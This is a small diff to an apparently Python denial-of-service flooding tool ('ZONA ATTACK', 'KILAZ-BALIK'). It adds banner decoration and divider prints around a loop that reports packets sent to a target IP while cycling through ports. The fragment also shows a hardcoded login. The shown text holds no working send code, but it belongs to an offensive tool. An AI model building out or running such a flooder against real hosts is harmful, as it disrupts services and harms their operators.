@@ -52,7 +52,7 @@ while attemps < 100:
     password = input('\033[94mEnter your password: \033[0m')
 
     if username == 'k0l4pz' and password == 'k0l4pz':
-        print('\033[33mWELCOME TO ZONA ATTACK!!\033[0m')
+        print('\033[33m***WELCOME TO ZONA ATTACK!!***\033[0m')
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -83,6 +83,8 @@ while True:
      sent = sent + 1
      port = port + 1
      print(f"\033[97m[🚀\033[99m KILAZ-BALIK\033[97m]   Sent  \033[33mPacket:::.... " +ip+ "\033[0m" )
+     print("\033[31m —— —— —— —— —— —— —— —— —— —— —— —— —— —— —— ——⟩⟩")
      print(f"\033[93m[💥\033[99m KILAZ-BALIK\033[93m]   Attack  \033[1mThread:::.... " +ip+ "\033[0m" )
+     print("\033[31m —— —— —— —— —— —— —— —— —— —— —— —— —— —— —— ——⟩⟩")
      if port == 65534:
        port = 1
